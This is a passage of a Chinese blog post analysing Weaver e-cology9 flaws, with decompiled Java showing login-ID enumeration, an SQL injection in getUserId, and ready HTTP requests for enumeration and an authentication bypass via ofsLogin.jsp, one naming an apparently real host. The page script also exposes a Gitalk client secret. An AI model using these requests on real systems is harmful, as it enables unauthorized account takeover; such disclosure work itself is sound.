var1)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot;-1&quot;</span>;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    <span class="type">RecordSet</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">    <span class="type">RecordSet</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4.executeQuery(<span class="string">&quot;select id from HrmResourceManager where loginId=? &quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">        <span class="keyword">if</span> (!var4.next()) &#123;</span><br><span class="line">            <span class="type">RecordSet</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">            var8.executeQuery(<span class="string">&quot;select id,isadaccount from HrmResource where loginId=? &quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">            <span class="keyword">if</span> (var8.next()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> var8.getString(<span class="string">&quot;isadaccount&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;1&quot;</span>.equals(var9)) &#123;</span><br><span class="line">                    String var10;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.isLoginMustUpPswd()) &#123;</span><br><span class="line">                        var10 = var8.getString(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                        var5.executeQuery(<span class="string">&quot;SELECT COUNT(id) FROM HrmResource WHERE haschangepwd = &#x27;y&#x27; and id= ?&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var10&#125;);</span><br><span class="line">                        <span class="keyword">if</span> (var5.next()) &#123;</span><br><span class="line">                            var6 = var5.getInt(<span class="number">1</span>) &lt;= <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!var6) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.isPassChangeReminder()) &#123;</span><br><span class="line">                            var10 = <span class="built_in">this</span>.settings.getChangePasswordDays();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="built_in">this</span>.settings.getDaysToRemind();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">var13</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">var14</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var15</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var16</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">var17</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">                            var5.executeQuery(<span class="string">&quot;select passwdchgdate from hrmresource where loginId = ? &quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var1&#125;);</span><br><span class="line">                            <span class="keyword">if</span> (var5.next()) &#123;</span><br><span class="line">                                var12 = var5.getString(<span class="number">1</span>);</span><br><span class="line">                                <span class="type">int</span> <span class="variable">var21</span> <span class="operator">=</span> TimeUtil.dateInterval(var12, TimeUtil.getCurrentDateString());</span><br><span class="line">                                <span class="keyword">if</span> (var21 &lt; Integer.parseInt(var10)) &#123;</span><br><span class="line">                                    var16 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                var15 = TimeUtil.dateAdd(var12, Integer.parseInt(var10) - Integer.parseInt(var11));</span><br><span class="line">                                <span class="type">int</span> var22;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    var22 = TimeUtil.dateInterval(var15, TimeUtil.getCurrentDateString());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (Exception var19) &#123;</span><br><span class="line">                                    var22 = <span class="number">0</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                var7 = Integer.parseInt(var11) - var22;</span><br><span class="line">                                <span class="keyword">if</span> (var22 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                    var17 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (!<span class="string">&quot;1&quot;</span>.equals(var16)) &#123;</span><br><span class="line">                                var2 = <span class="string">&quot;20&quot;</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;1&quot;</span>.equals(var17)) &#123;</span><br><span class="line">                                var2 = <span class="string">&quot;22&quot;</span>;</span><br><span class="line">                                var3.put(<span class="string">&quot;passwdelse&quot;</span>, var7);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        var2 = <span class="string">&quot;21&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        var3.put(<span class="string">&quot;resultMsg&quot;</span>, var2);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var20) &#123;</span><br><span class="line">        <span class="built_in">this</span>.writeLog(<span class="string">&quot;getPassChangedReminder,Exception.&quot;</span> + var20.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么根据这个差异便可以用来爆破<code>loginId</code>，如下图。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=status&amp;loginId=user</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>weoa.sundan.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520143947132.png"></p>
<p>当<code>type</code>等于<code>getUserid</code>时，代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;weaver.mobile.plugin.ecology.service.HrmResourceService&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;type&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;getUserid&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">loginId</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;loginId&quot;</span>));</span><br><span class="line">	<span class="type">HrmResourceService</span> <span class="variable">hr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HrmResourceService</span>();</span><br><span class="line">	<span class="type">int</span> <span class="variable">userid</span> <span class="operator">=</span> hr.getUserId(loginId);</span><br><span class="line">	result.put(<span class="string">&quot;userid&quot;</span>,userid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result.put(<span class="string">&quot;status&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>跟进<code>weaver.mobile.plugin.ecology.service.HrmResourceService</code>中的<code>getUserId</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getUserId</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        var2 = <span class="string">&quot;select id from HrmResource where loginid=&#x27;&quot;</span> + var1 + <span class="string">&quot;&#x27; and (accounttype is null  or accounttype=0) and status in (0,1,2,3)&quot;</span>;</span><br><span class="line">        var2 = var2 + <span class="string">&quot; union select id from HrmResourcemanager where loginid=&#x27;&quot;</span> + var1 + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">RecordSet</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">        var3.executeSql(var2);</span><br><span class="line">        <span class="keyword">if</span> (var3.next() &amp;&amp; Util.getIntValue(var3.getString(<span class="number">1</span>), <span class="number">0</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Util.getIntValue(var3.getString(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        var4.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若提供的<code>loginId</code>参数值在<code>HrmResourceManager</code>表中存在，就会返回相应<code>id</code>字段的值，否则会返回<code>0</code>。</p>
<p>根据此差异，此处同样可以被用来爆破<code>loginId</code>。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520145322146.png"></p>
<p>在新建人员信息时，相比于移动电话，登录名的存在更为必需，也就是说在数据库表存在数据的情况下，每条数据它的<code>mobile</code>字段可能为空，但是<code>loginid</code>字段为空的概率更小。不过第一种利用模糊查询<code>mobile</code>的信息泄漏利用手法，比后两种爆破<code>loginId</code>更好利用，因为仅仅涉及到数字。</p>
<p>在实战过程中，这三种信息泄漏的利用手法，可能会因为系统版本的差异导致未预期的结果。例如就拿第一种信息泄漏的利用手法来说，在实际测试中，发现大量的站仅返回了<code>&#123;&quot;status&quot;:&quot;1&quot;&#125;</code>，但却不见<code>loginId</code>键值对。</p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>在已知一个<code>loginId</code>值为<code>&quot;user1&quot;</code>的情况下，首先通过加密算法生成<code>loginTokenFromThird</code>的值。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151651201.png"></p>
<p>然后作如下请求，便能成功进入系统后台<code>/wui/index.html</code>页面。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/1/ofsLogin.jsp?syscode=1&amp;timestamp=1&amp;gopage=/wui/index.html&amp;receiver=user1&amp;loginTokenFromThird=793527b3f4855296c85629a7271e20e7</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png"></p>
<h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>目前厂商已发布了升级补丁以修复这个安全问题，请到厂商的补丁主页下载最新版本补丁包：<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.weaver.com.cn/cs/securityDownload.html?src=cn">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io">_0xf4n9x_</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0xf4n9x.github.io/weaver-ecology9-changeuserinfo-ofslogin.html">https://0xf4n9x.github.io/weaver-ecology9-changeuserinfo-ofslogin.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。未经许可禁止转载到微信公众号，其他转载请注明来自 <a href="https://0xf4n9x.github.io" target="_blank">_0xf4n9x_'s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/sqli/">sqli</a><a class="post-meta__tags" href="/tags/ecology/">ecology</a></div><div class="post_share"><div class="social-share" data-image="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/attacking-shiro-with-tomcat-memshell.html" title="利用Tomcat内存马攻击Shiro应用"><img class="cover" src="/img/post/attacking-shiro-with-tomcat-memshell/4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">利用Tomcat内存马攻击Shiro应用</div></div></a></div><div class="next-post pull-right"><a href="/realor-tianyi-multiple-sqli2rce.html" title="瑞友天翼应用虚拟化系统多个SQLi2RCE漏洞"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">瑞友天翼应用虚拟化系统多个SQLi2RCE漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/weaver-ecology9-browser-sqli.html" title="泛微e-cology9 browser.jsp SQL注入漏洞分析"><img class="cover" src="/img/post/weaver-ecology9-browser-sqli/20230305235041800.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-03</div><div class="title">泛微e-cology9 browser.jsp SQL注入漏洞分析</div></div></a></div><div><a href="/apache-shiro-deserialization-exploitation.html" title="Apache Shiro各版本反序列化漏洞利用"><img class="cover" src="/img/post/apache-shiro-deserialization-exploitation/2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-22</div><div class="title">Apache Shiro各版本反序列化漏洞利用</div></div></a></div><div><a href="/attacking-shiro-with-tomcat-memshell.html" title="利用Tomcat内存马攻击Shiro应用"><img class="cover" src="/img/post/attacking-shiro-with-tomcat-memshell/4.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">利用Tomcat内存马攻击Shiro应用</div></div></a></div><div><a href="/cdg-xstream-deserialization-arbitrary-file-upload.html" title="亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞"><img class="cover" src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-05</div><div class="title">亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞</div></div></a></div><div><a href="/attacking-shiro550-with-commons-collections.html" title="利用Commons Collections攻击Shiro550"><img class="cover" src="/img/post/attacking-shiro550-with-commons-collections/17.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">利用Commons Collections攻击Shiro550</div></div></a></div><div><a href="/cve-2021-44228-log4j2-jndi-attack.html" title="CVE-2021-44228 Log4j2 JNDI注入漏洞"><img class="cover" src="/img/post/cve-2021-44228-log4j2-jndi-attack/0.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-07</div><div class="title">CVE-2021-44228 Log4j2 JNDI注入漏洞</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">0x00 漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">0x01 影响范围</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#e-cology9%E6%9C%AC%E8%BA%AB%E7%89%88%E6%9C%AC"><span class="toc-text">e-cology9本身版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E7%89%88%E6%9C%AC"><span class="toc-text">补丁版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">补丁包分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90"><span class="toc-text">任意用户登录分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%86%E6%9E%90"><span class="toc-text">信息泄漏分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">0x04 修复建议</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520151811489.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By _0xf4n9x_</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '127fd27133c8e286cff8',
      clientSecret: 'f87b94b8813bcdae62b09baa633f85ef1a78107f',
      repo: '0xf4n9x.github.io',
      owner: '0xf4n9x',
      admin: ['0xf4n9x'],
      id: '3a81bac6f706221a12e1feb00ac5efb6',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.textContent= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'G-YRH7DCY1TL', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>